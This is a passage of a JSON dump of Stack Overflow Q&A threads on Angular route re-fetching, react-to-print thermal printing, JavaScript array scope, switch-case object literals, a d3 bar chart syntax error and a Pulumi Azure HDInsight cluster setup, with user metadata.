309, "user_id": 10719853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hlafNSlsL_0/AAAAAAAAAAI/AAAAAAAACJM/bEomlaQeUnM/photo.jpg?sz=128", "display_name": "Uros Kalajdzic", "link": "https://stackoverflow.com/users/10719853/uros-kalajdzic"}, "edited": false, "score": 0, "creation_date": 1558618636, "post_id": 56266601, "comment_id": 99167333, "body": "I don&#39;t see this code posted. Looks like another issue. I should be able to help if you can single out the current problem, and report what didn&#39;t work with my solution. Thanks."}, {"owner": {"reputation": 309, "user_id": 10719853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hlafNSlsL_0/AAAAAAAAAAI/AAAAAAAACJM/bEomlaQeUnM/photo.jpg?sz=128", "display_name": "Uros Kalajdzic", "link": "https://stackoverflow.com/users/10719853/uros-kalajdzic"}, "edited": false, "score": 0, "creation_date": 1558619614, "post_id": 56266601, "comment_id": 99167926, "body": "I would post it....There is no issue everything renders fine, but want to fetch new data from database when click sidebar button to the same component...URL changes but data not...this code works but it is very slow <a href=\"https://codeshare.io/amvrzj\" rel=\"nofollow noreferrer\">codeshare.io/amvrzj</a> @Nikhil"}], "tags": [], "owner": {"reputation": 5947, "user_id": 2924577, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/c499286ca761a5b21f3744ca229dffb0?s=128&d=identicon&r=PG&f=1", "display_name": "Nikhil", "link": "https://stackoverflow.com/users/2924577/nikhil"}, "is_accepted": false, "score": 1, "last_activity_date": 1558572603, "last_edit_date": 1558572603, "creation_date": 1558571223, "answer_id": 56266601, "question_id": 56265269, "link": "https://stackoverflow.com/questions/56265269/angular-re-fetch-data-after-parameter-change-get-request/56266601#56266601", "title": "Angular re-fetch data after parameter change GET request", "body": "<p>Since your are making an API call for data in <code>ngOnInit()</code>, requested data may not be available by the time your component loads. And Angular might be reusing the same instance of the component, making <code>ngOnInit()</code> to be called only once.</p>\n\n<p>You can use Angular Resolvers to ensure that you have the required data before loading the component.</p>\n\n<p>1) Create a route resolver to fetch the required data before loading the route.</p>\n\n<p><strong>PostDataResolver.ts:</strong></p>\n\n<pre><code>// ... imports\n\n@Injectable()\nexport class PostDataResolver implements Resolve&lt;any&gt; {\n\n constructor(private serverService: ServerService) {}\n\n resolve(route: ActivatedRouteSnapshot) {\n\n   const id = route.paramMap.get('id');\n\n   return this.serverService.getPosts(id);\n }\n}   \n</code></pre>\n\n<p>2) Add this resolver to your routing module:</p>\n\n<pre><code>{ path: \"oglas/:id\", component: PostComponent, resolve: { postData: PostDataResolver }}\n</code></pre>\n\n<p>3) Then access the resolved data in your component.</p>\n\n<p><strong>PostComponent.ts:</strong></p>\n\n<pre><code>export class PostComponent implements OnInit {\n  post: Post[];\n\n  constructor(\n    private route: ActivatedRoute,\n    private serverService: ServerService\n  ) {}\n\n  ngOnInit(): void {\n    this.post = this.route.snapshot.data.postData;\n  }\n}\n</code></pre>\n\n<p>This ensures that you have the latest and appropriate data before the component loads.</p>\n"}, {"tags": [], "owner": {"reputation": 309, "user_id": 10719853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hlafNSlsL_0/AAAAAAAAAAI/AAAAAAAACJM/bEomlaQeUnM/photo.jpg?sz=128", "display_name": "Uros Kalajdzic", "link": "https://stackoverflow.com/users/10719853/uros-kalajdzic"}, "is_accepted": false, "score": 0, "last_activity_date": 1558626816, "creation_date": 1558626816, "answer_id": 56278949, "question_id": 56265269, "link": "https://stackoverflow.com/questions/56265269/angular-re-fetch-data-after-parameter-change-get-request/56278949#56278949", "title": "Angular re-fetch data after parameter change GET request", "body": "<p>Got it...</p>\n\n<pre><code>import { Component, OnInit, OnChanges } from \"@angular/core\";\nimport { ActivatedRoute, Router } from \"@angular/router\";\nimport { Post } from \"../post.model\";\nimport { ServerService } from \"../server.service\";\n\n@Component({\n  selector: \"post\",\n  templateUrl: \"./post.component.html\",\n  styleUrls: [\"./post.component.css\"]\n})\nexport class PostComponent implements OnInit {\n  post: Post[];\n  id: number;\n\n  constructor(\n    private route: ActivatedRoute,\n    private serverService: ServerService\n  ) {}\n\n  ngOnInit(): void {\n    this.route.paramMap.subscribe(params =&gt; {\n      this.id = parseInt(params.get(\"id\"));\n      this.getPost(this.id);\n    });\n  }\n\n  getPost(id: number): void {\n    this.serverService.getPosts(id).subscribe(post =&gt; (this.post = post));\n  }\n}\n</code></pre>\n\n<p>This code re-fetch data to a component</p>\n\n<pre><code>ngOnInit(): void {\n    this.route.paramMap.subscribe(params =&gt; {\n      this.id = parseInt(params.get(\"id\"));\n      this.getPost(this.id);\n    });\n  }\n</code></pre>\n\n<p>Thank you all for your effort!</p>\n"}], "owner": {"reputation": 309, "user_id": 10719853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hlafNSlsL_0/AAAAAAAAAAI/AAAAAAAACJM/bEomlaQeUnM/photo.jpg?sz=128", "display_name": "Uros Kalajdzic", "link": "https://stackoverflow.com/users/10719853/uros-kalajdzic"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1055, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1558626816, "creation_date": 1558560637, "question_id": 56265269, "link": "https://stackoverflow.com/questions/56265269/angular-re-fetch-data-after-parameter-change-get-request", "title": "Angular re-fetch data after parameter change GET request", "body": "<p>How to re-fetch data after parameter change from:\noglas/1 to oglas/2 by click, so when put URL and than click ENTER everything works, but when click on oglas/2 button when oglas/1 is rendered URL changes to oglas/2 but data is from oglas/1?</p>\n\n<p>TS</p>\n\n<pre><code>import { Component, OnInit } from \"@angular/core\";\nimport { ActivatedRoute } from \"@angular/router\";\nimport { Post } from \"../post.model\";\nimport { ServerService } from \"../server.service\";\n\n@Component({\n  selector: \"post\",\n  templateUrl: \"./post.component.html\",\n  styleUrls: [\"./post.component.css\"]\n})\nexport class PostComponent implements OnInit {\n  post: Post[];\n\n  constructor(\n    private route: ActivatedRoute,\n    private serverService: ServerService\n  ) {}\n\n  ngOnInit(): void {\n    this.getPost();\n  }\n\n  getPost(): void {\n    const id = +this.route.snapshot.paramMap.get(\"id\");\n    this.serverService.getPosts(id).subscribe(post =&gt; (this.post = post));\n  }\n}\n</code></pre>\n\n<p>Service</p>\n\n<pre><code>import { HttpClient } from \"@angular/common/http\";\nimport { Injectable } from \"@angular/core\";\nimport { Post } from \"./post.model\";\nimport { User } from \"./user.model\";\nimport { Observable } from \"rxjs\";\n\n@Injectable({ providedIn: \"root\" })\nexport class ServerService {\n  usersUrl = \"http://localhost:3000/users\";\n  postsUrl = \"http://localhost:3000/posts\";\n\n  constructor(private http: HttpClient) {}\n\n  getPosts(id: number | string): Observable&lt;Post[]&gt; {\n    const url = `${this.postsUrl}/${id}`;\n    return this.http.get&lt;Post[]&gt;(url);\n  }\n\n  getUser(id: number | string): Observable&lt;User[]&gt; {\n    const url = `${this.usersUrl}/${id}`;\n    return this.http.get&lt;User[]&gt;(url);\n  }\n}\n\n</code></pre>\n"}, {"tags": ["javascript", "reactjs", "typescript", "thermal-printer"], "comments": [{"owner": {"reputation": 534, "user_id": 2735157, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fbac255e2aa7e535f7ef954d17ab14f2?s=128&d=identicon&r=PG&f=1", "display_name": "Rahul Bhanushali", "link": "https://stackoverflow.com/users/2735157/rahul-bhanushali"}, "edited": false, "score": 0, "creation_date": 1603353043, "post_id": 56265202, "comment_id": 114011617, "body": "Did you find a solution to this yet?"}], "owner": {"reputation": 111, "user_id": 3332428, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5FLUp.jpg?s=128&g=1", "display_name": "Champlix Champlow", "link": "https://stackoverflow.com/users/3332428/champlix-champlow"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 812, "favorite_count": 0, "answer_count": 0, "score": 6, "last_activity_date": 1558560184, "creation_date": 1558560184, "question_id": 56265202, "link": "https://stackoverflow.com/questions/56265202/how-do-i-configure-to-print-for-a-thermal-paper-printer-with-react-to-print", "title": "How do I configure to print for a thermal paper printer with react-to-print?", "body": "<p>I'm working in a React page, and I'm using <a href=\"https://github.com/gregnb/react-to-print\" rel=\"noreferrer\">react-to-print</a> for printing. But now I need to print in a thermal paper printer. Those that prints tokens, tickets, etc.</p>\n\n<p>I've already looked over <a href=\"https://github.com/gregnb/react-to-print/issues/45\" rel=\"noreferrer\">this question</a>, but I still don't know which size to set or how to create a size.</p>\n\n<p>And I've already looked over the <a href=\"https://github.com/gregnb/react-to-print/blob/master/src/index.tsx#L113\" rel=\"noreferrer\">source code</a>, to learn more about the argument <b>pageStyle</b> and found this as default:</p>\n\n<pre><code>\"@page { size: auto;  margin: 0mm; } @media print { body { -webkit-print-color-adjust: exact; } }\"\n</code></pre>\n\n<p>But I didn't figured out how to set this argument to print at thermal printer size.</p>\n\n<p>What argument do I pass in pageStyle parameter to print in that size? \n<br>Is there a list of page styles or a way of configuring a new page style?\n<br>How do I test this without a printing?</p>\n"}, {"tags": ["javascript", "arrays", "function"], "comments": [{"owner": {"reputation": 135520, "user_id": 1715579, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/4B4y1.png?s=128&g=1", "display_name": "p.s.w.g", "link": "https://stackoverflow.com/users/1715579/p-s-w-g"}, "edited": false, "score": 0, "creation_date": 1558560198, "post_id": 56265169, "comment_id": 99146731, "body": "<code>console.log(myObject[0])</code>?"}, {"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 1, "creation_date": 1558560519, "post_id": 56265169, "comment_id": 99146844, "body": "I do have the feeling that you execute <code>other</code> <i>before</i> <code>something</code> ..."}], "answers": [{"comments": [{"owner": {"reputation": 15, "user_id": 11517934, "user_type": "registered", "profile_image": "https://graph.facebook.com/1054443264750839/picture?type=large", "display_name": "kjoszi", "link": "https://stackoverflow.com/users/11517934/kjoszi"}, "edited": false, "score": 0, "creation_date": 1558560452, "post_id": 56265207, "comment_id": 99146821, "body": "and when i have declared globally but i have function in function and want to call it in other function?"}, {"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558560570, "post_id": 56265207, "comment_id": 99146869, "body": "&quot;this happens by default&quot; what happens by default? Also are you sure that the question in its current state can be answered already?"}, {"owner": {"reputation": 15, "user_id": 11517934, "user_type": "registered", "profile_image": "https://graph.facebook.com/1054443264750839/picture?type=large", "display_name": "kjoszi", "link": "https://stackoverflow.com/users/11517934/kjoszi"}, "edited": false, "score": 0, "creation_date": 1558560742, "post_id": 56265207, "comment_id": 99146921, "body": "i have this but ready function cant read that from message function. <a href=\"https://pastebin.com/EAqpQtzf\" rel=\"nofollow noreferrer\">pastebin.com/EAqpQtzf</a> - either is array declared, i missed that"}, {"owner": {"reputation": 38349, "user_id": 10221765, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0e762fef8d87381d5cbd58d851d1b816?s=128&d=identicon&r=PG&f=1", "display_name": "Jack Bashford", "link": "https://stackoverflow.com/users/10221765/jack-bashford"}, "reply_to_user": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558561108, "post_id": 56265207, "comment_id": 99147036, "body": "Sorry @JonasWilms - I meant to add the function order. I&#39;ll edit my answer."}, {"owner": {"reputation": 38349, "user_id": 10221765, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0e762fef8d87381d5cbd58d851d1b816?s=128&d=identicon&r=PG&f=1", "display_name": "Jack Bashford", "link": "https://stackoverflow.com/users/10221765/jack-bashford"}, "reply_to_user": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558561198, "post_id": 56265207, "comment_id": 99147060, "body": "Edited @JonasWilms"}], "tags": [], "owner": {"reputation": 38349, "user_id": 10221765, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0e762fef8d87381d5cbd58d851d1b816?s=128&d=identicon&r=PG&f=1", "display_name": "Jack Bashford", "link": "https://stackoverflow.com/users/10221765/jack-bashford"}, "is_accepted": false, "score": 1, "last_activity_date": 1558561186, "last_edit_date": 1558561186, "creation_date": 1558560205, "answer_id": 56265207, "question_id": 56265169, "link": "https://stackoverflow.com/questions/56265169/how-to-push-values-to-array-in-one-function-and-read-it-in-another-function/56265207#56265207", "title": "How to push values to array in one function and read it in another function?", "body": "<p>It's declared globally - so just calling <code>something()</code> then <code>other()</code> will ensure that there are elements in the array. If you were calling them in the wrong order, then the function was displaying the empty array first, then adding an element to it.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var myObject = [];\r\n\r\nfunction something() {\r\n  myObject.push(\"thing\");\r\n}\r\n\r\nfunction other() {\r\n  console.log(myObject);\r\n}\r\n\r\nsomething();\r\nother();</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>If you want to log each item on a separate line:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var myObject = [];\r\n\r\nfunction something() {\r\n  myObject.push(\"thing\");\r\n}\r\n\r\nfunction other() {\r\n  myObject.forEach(e =&gt; console.log(e));\r\n}\r\n\r\nsomething();\r\nsomething();\r\nsomething();\r\nother();</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>Also, you're dealing with an <em>array</em>, not an object. An object looks like this:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var anObject = {\r\n  key1: \"value1\",\r\n  key2: true,\r\n  key3: 42.01\r\n};\r\n\r\nconsole.log(anObject);</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 15, "user_id": 11517934, "user_type": "registered", "profile_image": "https://graph.facebook.com/1054443264750839/picture?type=large", "display_name": "kjoszi", "link": "https://stackoverflow.com/users/11517934/kjoszi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 196, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558561186, "creation_date": 1558560008, "last_edit_date": 1558560363, "question_id": 56265169, "link": "https://stackoverflow.com/questions/56265169/how-to-push-values-to-array-in-one-function-and-read-it-in-another-function", "title": "How to push values to array in one function and read it in another function?", "body": "<p>Here is my code:</p>\n\n<pre><code>var myObject = [];\nfunction something() {\n    myObject.push(\"thing\");\n}\n\nfunction other() {\n    console.log(myObject);\n}\n</code></pre>\n\n<p>How can I let <code>other</code> see the items pushed into <code>myObject</code> by <code>something</code>?</p>\n"}, {"tags": ["javascript", "switch-statement"], "comments": [{"owner": {"reputation": 507143, "user_id": 1048572, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/7f2c4de95e8f4f8f5a71c3aaf0ed312a?s=128&d=identicon&r=PG", "display_name": "Bergi", "link": "https://stackoverflow.com/users/1048572/bergi"}, "edited": false, "score": 2, "creation_date": 1558560066, "post_id": 56265158, "comment_id": 99146693, "body": "Those have nothing to do with <code>switch</code>/<code>case</code> syntax, they are parts of the object literal that is passed as an argument to <code>callExternalWindow</code>"}], "answers": [{"tags": [], "owner": {"reputation": 38349, "user_id": 10221765, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0e762fef8d87381d5cbd58d851d1b816?s=128&d=identicon&r=PG&f=1", "display_name": "Jack Bashford", "link": "https://stackoverflow.com/users/10221765/jack-bashford"}, "is_accepted": false, "score": 0, "last_activity_date": 1558560144, "creation_date": 1558560144, "answer_id": 56265195, "question_id": 56265158, "link": "https://stackoverflow.com/questions/56265158/javascript-switch-case-syntax-is-confusing-me/56265195#56265195", "title": "Javascript Switch-Case syntax is confusing me", "body": "<p>The rest of the code (the function) is just passing an object literal containing methods to <code>e.callExternalWindow</code>, as well as the arguments <code>-1</code> and <code>e.curPerformerInfo.isHotConnectionEnabled</code>.</p>\n"}], "owner": {"reputation": 407, "user_id": 9090967, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/48f923cfa42145e6edcd24b37a7c6c46?s=128&d=identicon&r=PG&f=1", "display_name": "Roger_88", "link": "https://stackoverflow.com/users/9090967/roger-88"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 21, "favorite_count": 0, "closed_date": 1558560369, "answer_count": 1, "score": 0, "last_activity_date": 1558560144, "creation_date": 1558559943, "question_id": 56265158, "link": "https://stackoverflow.com/questions/56265158/javascript-switch-case-syntax-is-confusing-me", "closed_reason": "Duplicate", "title": "Javascript Switch-Case syntax is confusing me", "body": "<p>In the following code what those numbers means? I mean, 0, 1 2 and -1. As far I understand if \"e.curPerformerInfo.chatType\" is FREE or SIMPLE it will call \"callExternalWindow\" passing \"ExternalWindows.WINDOW_INIT_SIMPLE_PRIVATE as argument and ...?</p>\n\n<pre><code>switch (e.curPerformerInfo.chatType) {\n    case ChatTypeText.FREE:\n    case ChatTypeText.SIMPLE:\n        e.callExternalWindow(ExternalWindows.WINDOW_INIT_SIMPLE_PRIVATE, {\n            0: function() {\n                e.socketCaller.startSimpleChat()\n            },\n            1: function() {\n                e.socketCaller.startPrivateChat()\n            },\n            2: function() {\n                e.socketCaller.startHotConnectionChat()\n            }\n        }, -1, e.curPerformerInfo.isHotConnectionEnabled);\n}\n</code></pre>\n"}, {"tags": ["javascript", "html"], "comments": [{"owner": {"reputation": 135520, "user_id": 1715579, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/4B4y1.png?s=128&g=1", "display_name": "p.s.w.g", "link": "https://stackoverflow.com/users/1715579/p-s-w-g"}, "edited": false, "score": 0, "creation_date": 1558560031, "post_id": 56265139, "comment_id": 99146678, "body": "<code>\\*</code> and <code>\\_</code> are not valid javascript (unless they&#39;re inside a string/regex). Also you have a stray <code>;</code> after the first <code>if</code> block. That seems to be the source of the <code>unexpected token &quot;else&quot;</code>"}, {"owner": {"reputation": 1637, "user_id": 4430536, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/51713a7c5ebbdcb411bb821889591145?s=128&d=identicon&r=PG&f=1", "display_name": "Clauric", "link": "https://stackoverflow.com/users/4430536/clauric"}, "reply_to_user": {"reputation": 135520, "user_id": 1715579, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/4B4y1.png?s=128&g=1", "display_name": "p.s.w.g", "link": "https://stackoverflow.com/users/1715579/p-s-w-g"}, "edited": false, "score": 0, "creation_date": 1558560116, "post_id": 56265139, "comment_id": 99146708, "body": "I have no idea why it is being translated that way. They should be <code>d.Pts_diff</code>"}], "answers": [{"comments": [{"owner": {"reputation": 1637, "user_id": 4430536, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/51713a7c5ebbdcb411bb821889591145?s=128&d=identicon&r=PG&f=1", "display_name": "Clauric", "link": "https://stackoverflow.com/users/4430536/clauric"}, "edited": false, "score": 0, "creation_date": 1558560295, "post_id": 56265201, "comment_id": 99146767, "body": "Thanks, no idea how I missed that"}, {"owner": {"reputation": 1138, "user_id": 2375051, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1083145e6091d0c2a8ab42e460d7c65?s=128&d=identicon&r=PG", "display_name": "Armin", "link": "https://stackoverflow.com/users/2375051/armin"}, "reply_to_user": {"reputation": 1637, "user_id": 4430536, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/51713a7c5ebbdcb411bb821889591145?s=128&d=identicon&r=PG&f=1", "display_name": "Clauric", "link": "https://stackoverflow.com/users/4430536/clauric"}, "edited": false, "score": 0, "creation_date": 1558560525, "post_id": 56265201, "comment_id": 99146845, "body": "No problem. It happens (a lot)."}], "tags": [], "owner": {"reputation": 1138, "user_id": 2375051, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1083145e6091d0c2a8ab42e460d7c65?s=128&d=identicon&r=PG", "display_name": "Armin", "link": "https://stackoverflow.com/users/2375051/armin"}, "is_accepted": false, "score": 2, "last_activity_date": 1558560183, "creation_date": 1558560183, "answer_id": 56265201, "question_id": 56265139, "link": "https://stackoverflow.com/questions/56265139/displaying-negative-values-on-barchart/56265201#56265201", "title": "Displaying negative values on barchart", "body": "<p>I suppose your problem is this line</p>\n\n<pre><code>if (d.Pts\\_diff &lt; 0) {return 800 +(-1)\\*d.Pts\\_diff};\n</code></pre>\n\n<p>You have an extra \";\" at the end, because next line starts with <code>else</code>.\nRemove semicolon</p>\n"}], "owner": {"reputation": 1637, "user_id": 4430536, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/51713a7c5ebbdcb411bb821889591145?s=128&d=identicon&r=PG&f=1", "display_name": "Clauric", "link": "https://stackoverflow.com/users/4430536/clauric"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 16, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1558560183, "creation_date": 1558559841, "question_id": 56265139, "link": "https://stackoverflow.com/questions/56265139/displaying-negative-values-on-barchart", "title": "Displaying negative values on barchart", "body": "<p>I'm trying to create a chart where I can display a points difference for teams. Obviously some teams have negative points differences, while some teams have positive points differences.</p>\n\n<p>The code I'm using is:</p>\n\n<pre><code>myRectangle.enter()\n    .append(\"rect\")\n    .attr(\"x\", function(d, i) {\n        return 45 + i\\*50;\n        })\n    .attr(\"y\", function(d) {\n        if (d.Pts\\_diff &lt; 0) {return 800 +(-1)\\*d.Pts\\_diff};\n        else {return 400 - d.Pts\\_diff;}\n        })\n    .attr(\"width\", 45)\n    .attr(\"height\", function(d) {\n        return d.Pts\\_diff;\n    .attr(\"fill\", function(d) {\n        if (d.Pts\\_diff &gt; 300) {return \"red\";}\n        else if (d.Pts\\_diff &gt; 200) {return \"orange\";}\n        else if (d.Pts\\_diff &gt; 100) {return \"yellow\";}\n        else if (d.Pts\\_diff &gt; 0) {return \"green\";}\n        else if (d.Pts\\_diff &gt; -100) {return \"blue\";}\n        else {return \"purple;\"}\n        })\n    })\n</code></pre>\n\n<p>When I do that I get an error saying that I have an unexpected token \"else\".</p>\n\n<p>Any suggestions?</p>\n"}, {"tags": ["javascript", "azure", "apache-spark", "azure-hdinsight", "pulumi"], "answers": [{"tags": [], "owner": {"reputation": 30010, "user_id": 1171619, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/6f1d9a240fc75d00c4a4ffa000ea4bd1?s=128&d=identicon&r=PG", "display_name": "Mikhail Shilkov", "link": "https://stackoverflow.com/users/1171619/mikhail-shilkov"}, "is_accepted": false, "score": 1, "last_activity_date": 1558678014, "last_edit_date": 1558678014, "creation_date": 1558595210, "answer_id": 56269774, "question_id": 56265138, "link": "https://stackoverflow.com/questions/56265138/errors-creating-simple-azure-hdinsight-spark-cluster-with-pulumi/56269774#56269774", "title": "Errors Creating Simple Azure HDInsight Spark Cluster with Pulumi", "body": "<p>You are hitting a syntax issue because exports in JavaScript are different from TypeScript. Your copied export would work in a TS program, but in JS you should write:</p>\n\n<pre><code>exports.sparkClusterName = sparkCluster.name;\n</code></pre>\n\n<p>If you are new to both JavaScript and TypeScript, I suggest you switching to TypeScript and using an editor like Visual Studio Code to highlight errors at edit time. There are still a number of those in your code: <code>enable</code> instead of <code>enabled</code>, <code>vmSize</code> missing in <code>zookeeperNode</code>, <code>storageAccountKey</code> and <code>storageContainerId</code> missing in <code>storageAccounts</code>.</p>\n\n<p>On top of that, your usernames and password are violating some policies, but you would only discover that while running <code>pulumi up</code>, not at edit time.</p>\n\n<p>Here is my take:</p>\n\n<pre class=\"lang-ts prettyprint-override\"><code>const sparkCluster = new azure.hdinsight.SparkCluster(\"testSparkCluster\", {\n    clusterVersion: \"3.6\",\n    componentVersion: {\n        spark: \"2.3\",\n    },\n    gateway: {\n        enabled: true,\n        password: \"@P6g4KMvlhjM\",\n        username: \"username\",\n    },\n    name: \"example-hdisparkcluster\",\n    resourceGroupName: resourceGroup.apply(rg =&gt; rg.name),\n    roles: {\n        headNode: {\n            password: \"0@Gkv81xt!lR\",\n            username: \"usernamehn\",\n            vmSize: \"Standard_A3\",\n        },\n        workerNode: {\n            password: \"Wx63!ZMnePHK\",\n            targetInstanceCount: 3,\n            username: \"usernamewn\",\n            vmSize: \"Standard_A3\",\n        },\n        zookeeperNode: {\n            password: \"&amp;43MhoXfZ5ar\",\n            username: \"usernamezn\",\n            vmSize: \"Standard_A3\",\n        },\n    },\n    storageAccounts: [{\n        isDefault: true,\n        storageAccountKey: storageAccount.primaryAccessKey,\n        storageContainerId: storageContainer.id,\n    }],\n    tier: \"Standard\",\n});\n</code></pre>\n\n<p>UPDATE: I created a <a href=\"https://github.com/pulumi/examples/tree/master/azure-ts-hdinsight-spark\" rel=\"nofollow noreferrer\">full working example</a>.</p>\n"}], "owner": {"reputation": 11, "user_id": 11541626, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-adRUuK6vYG0/AAAAAAAAAAI/AAAAAAAAFBE/f_Nx6G_koYU/photo.jpg?sz=128", "display_name": "Nick", "link": "https://stackoverflow.com/users/11541626/nick"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1558678014, "creation_date": 1558559833, "question_id": 56265138, "link": "https://stackoverflow.com/questions/56265138/errors-creating-simple-azure-hdinsight-spark-cluster-with-pulumi", "title": "Errors Creating Simple Azure HDInsight Spark Cluster with Pulumi", "body": "<p>I am attempting to use the Pulumi Javascript SDK to create a HDInsight Spark Cluster on Azure. I have followed the tutorials Pulumi provides on creating a \"hello world\" GCP Kubernetes cluster and gone through the JavaScript examples in the Pulumi Examples repo on github but have had no luck in successfully creating the cluster.</p>\n\n<p>I have attempted changing my <code>export</code> statements multiple times based on the examples in the Pulumi repo but I always get an \"unhandled exception\" error followed by a stacktrace when I run <code>pulumi up</code> inside my pulumi project root directory. I have tried using the following export statements so far. </p>\n\n<pre><code>    //attempt 1\n    export const sparkClusterName = sparkCluster.name\n\n    //attempt 2\n    export const sparkClusterOutput = sparkCluster.output\n\n    //attempt 3\n    export const sparkEndpoint = sparkCluster.httpsEndpoint\n</code></pre>\n\n<p>I'm using Visual Studio Code as my IDE\nRunning all code on a MacBook Pro with Mojave\nusing Pulumi version 0.17.11\nusing node version 12.1.0\nthe azure cli and pulumi cli tools are both installed</p>\n\n<p>My <code>index.js</code> program is as follows:</p>\n\n<pre><code>\"use strict\";\nconst pulumi = require(\"@pulumi/pulumi\");\nconst azure = require(\"@pulumi/azure\");\n\n// Retrieve an Azure Resource Group\nconst resourceGroup = pulumi.output(azure.core.getResourceGroup({\n    name: \"MyResourceGroup\",\n}));\n//Create Spark Cluster\nconst sparkCluster = new azure.hdinsight.SparkCluster(\"testSparkCluster\", {\n    clusterVersion: \"3.6\",\n    componentVersion: {\n        spark: \"2.3\",\n    },\n    gateway: {\n        enable: true,\n        password: \"laDK#21\",\n        username: \"USERname\",\n    },\n    location: resourceGroup.apply(resourceGroup =&gt; resourceGroup.location),\n    name: \"example-hdisparkcluster\",\n    resourceGroupName: resourceGroup.apply(resourceGroup =&gt; resourceGroup.name),\n    roles: {\n        headNode: {\n            password: \"AAAlllddck11122$$3\",\n            username: \"USerNameladkfj\",\n            vmSize: \"Standard_A3\",\n        },\n        workerNode: {\n            password: \"asdlfaDDF143k#@#\",\n            targetInstanceCount: 3,\n            username: \"USernaemls\",\n            vmSize: \"Standard_A3\",\n        },\n        zookeeperNode: {\n            password: \"ASDKLlkjjj##@@323\",\n            username: \"USERname2323\",\n        },\n    },\n    storageAccounts: [{\n        isDefault: true,\n    }],\n    tier: \"Standard\",\n});\n\n// Export the spark cluster\nexport const sparkClusterName = sparkCluster.name;\n//export const sparkName = sparkCluster.output\n//export const sparkEndpoint = sparkCluster.httpsEndpoint\n</code></pre>\n\n<p>The expected result should be a success from pulumi CLI showing the new stack and Spark Cluster being created (and then being able to view the cluster on the Azure Portal).\nInstead the following error and stack trace is thrown:</p>\n\n<pre><code>Previewing update (dev):\n\n     Type                 Name                         Plan       Info\n +   pulumi:pulumi:Stack  HDInsight_Spark_Cluster-dev  create     1 error\n\nDiagnostics:\n  pulumi:pulumi:Stack (HDInsight_Spark_Cluster-dev):\n    error: Running program '/Users/workspace/Pulumi Workspace/Pulumi HDInsight Testing' failed with an unhandled exception:\n    /Users/workspace/Pulumi Workspace/Pulumi HDInsight Testing/index.js:50\n    export const sparkClusterName = sparkCluster.name;\n    ^^^^^^\n\n    SyntaxError: Unexpected token export\n        at Module._compile 